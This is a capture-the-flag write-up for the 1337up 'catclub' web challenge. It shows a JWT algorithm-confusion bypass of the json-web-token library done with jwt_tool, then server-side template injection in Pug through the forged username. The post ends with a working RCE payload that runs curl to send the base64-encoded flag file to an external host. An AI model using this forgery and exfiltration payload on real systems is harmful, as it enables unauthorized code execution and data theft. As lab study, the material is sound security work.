+++
title = "1337up ctf catclub writeup"
author = ["curtainp"]
date = 2024-11-19

[taxonomies]
tags = ["CTF", "writeups", "Web", "JWT", "SSTI"]
categories = ["Security"]

[extra]
toc = true
comment = true
+++

# Description

{{ figure(src="./2024-11-19_15-38.png" alt="Cat Club")}}

## Recon

Here we have source code and URL. After some investigation, we can find that there
is only a **login/register** endpoint here, which may help us in our next move.

{{ figure(src="./2024-11-19_15-44.png" alt="login endpoint")}}

We register with a random account `hacker123`  and login in. Now, we see four
very cute cats and a title with our registered username, **and since the username
is displayed directly as is, we can guess that there may be injection-related
vulnerabilities**. 

{{ figure(src="./2024-11-19_15-55_1.png" alt="logined")}}

And second interesting thing is that the request carries a JWT cookie.

{{ figure(src="./2024-11-19_16-06.png" alt="JWT")}}

## Expolit

We already have the above findings in hand and now do a targeted search of the
source code. Since this is a JavaScript project, we get the `package.json` to
see its dependencies:

```json,hl_lines=15
{
    "name": "cat-club",
    "version": "4.2.0",
    "main": "app/app.js",
    "scripts": {
        "start": "node app/app.js"
    },
    "dependencies": {
        "bcryptjs": "^2.4.3",
        "cookie-parser": "^1.4.6",
        "dotenv": "^16.4.5",
        "pug": "^3.0.3",
        "express": "^4.21.0",
        "express-session": "^1.18.0",
        "json-web-token": "~3.0.0",
        "pg": "^8.12.0",
        "sequelize": "^6.37.3"
    },
    "devDependencies": {
        "nodemon": "^3.1.4"
    },
    "engines": {
        "node": ""
    },
    "license": "MIT",
    "keywords": [],
    "author": "",
    "description": ""
}
```

Notice the highlighted line, which is dependency library of JWT handled in
JavaScript, search it in [npmjs](https://www.npmjs.com/search):

{{ figure(src="./2024-11-19_16-26.png" alt="npmjs search")}}

And there's nothing strange about the usage. However, we quickly discovered a
high-risk vulnerability on the security page.

{{ figure(src="./2024-11-19_16-26_1.png" alt="JWT Algorithm Confusion")}}

We can learn more detail infomation about this vulnerability in [PortSwigger
Academy](https://portswigger.net/web-security/jwt/algorithm-confusion).
After we have familiarized ourselves with how this vulnerability works, in order
to expolit it.

**we need `public key` (in first request we can get orginal
alg_type is RS256)**.

Fortunately, the program has an endpoint that provides a public key.

```js
router.get("/jwks.json", async (req, res) => {
    try {
        const publicKey = await fsPromises.readFile(path.join(__dirname, "..", "public_key.pem"), "utf8");
        const publicKeyObj = crypto.createPublicKey(publicKey);
        const publicKeyDetails = publicKeyObj.export({ format: "jwk" });

        const jwk = {
            kty: "RSA",
            n: base64urlEncode(Buffer.from(publicKeyDetails.n, "base64")),
            e: base64urlEncode(Buffer.from(publicKeyDetails.e, "base64")),
            alg: "RS256",
            use: "sig",
        };

        res.json({ keys: [jwk] });
    } catch (err) {
        res.status(500).json({ message: "Error generating JWK" });
    }
});
```

```sh
❯ curl https://catclub-0.ctf.intigriti.io/jwks.json | jq .
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   410  100   410    0     0    221      0  0:00:01  0:00:01 --:--:--   221
{
  "keys": [
    {
      "kty": "RSA",
      "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw",
      "e": "AQAB",
      "alg": "RS256",
      "use": "sig"
    }
  ]
}
```
And we can transfer JWK to PEM format key with [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWK_to_PEM()&input=eyJrZXlzIjpbeyJrdHkiOiJSU0EiLCJuIjoidzRvUEV4LTQ0OFhRV0hfT3RTV044TDBOVURVLXJ2MWpNaUwwczRjbGN1eVZZdmdwU1Y3RnN2QUc2NUVuRWhYYVlwWWVNZjFHTW1VeEJjeVFPcGF0aEwxemYzX0prNUlzYmhFbXVVWjI4Q2NkOGwyZ09jVVJWRkEzajRxTXQzNE9sUHF6ZjluWEJ2bGpudFR1WmNRelljR0V0TTdTZDlzU21nOHVWeDhmMVdPbVVGQ2FxdEMyNkhkakJNbk5maG5MS1k5aVB4RlBHY0U4cWE4U3NyblJmVDVISmpTUnVfSm1HbFlDckZTb2Y1cF9FMFdQeUNVYkFWNXJmZ1RtMkNld0Y3dklQMW5lSTVqd2xjbTIyWDJ0OG9wVXJMYnJKWW9XRmVZWk9ZX1dyOXZaYjIzeG1tZ285OE9BYzVpY3N2enFZT0RRTEN4dzRoOUl4R0VtTVotSGR3IiwiZSI6IkFRQUIiLCJhbGciOiJSUzI1NiIsInVzZSI6InNpZyJ9XX0&oeol=CRLF) 

{{ figure(src="./2024-11-19_16-59.png" alt="JWK to PEM")}}

Further, in the endpoint that returns the `Cats Gallery` after user has
successfully loggedin, we can see that the username is also injected into the
server-side template in advance in JWT.

```js,hl_lines=17-20
router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});
```

{% tip(header="Tip") %}
[hacktricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#pugjs-nodejs) have collected awesome lists for `SSTI`
{% end %}

## Solution

1. exploit [json-web-token algorithm-confusion](https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355) to bypass login in JWT verifying.
2. use `SSTI` to RCE.

```sh
❯ python3 jwt_tool.py --exploit k -pk ~/Downloads/pubkey -I -pc username -pv "#{7*7}" $JWT

        \   \        \         \          \                    \ 
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.2.7                \______|             @ticarpi      

Original JWT: 

File loaded: /home/ada/Downloads/pubkey
jwttool_697a82c0d94b5cd145edc825ef911a2d - EXPLOIT: Key-Confusion attack (signing using the Public Key as the HMAC secret)
(This will only be valid on unpatched implementations of JWT.)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7Nyo3fSJ9.lsLiuUrEkr81Z73IyAJmF7gTJfp9WwqErjPlr9e9UvI
```

Use this new JWT and reload the page, we see:

{{ figure(src="./2024-11-19_17-20.png" alt="SSTI Successful")}}

Now, change to real RCE payload:

```sh
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('curl <web service>/?flag=$(cat /flag* | base64)')}()}
```

which can use [ngrok](https://ngrok.com/) for proxy our web service.

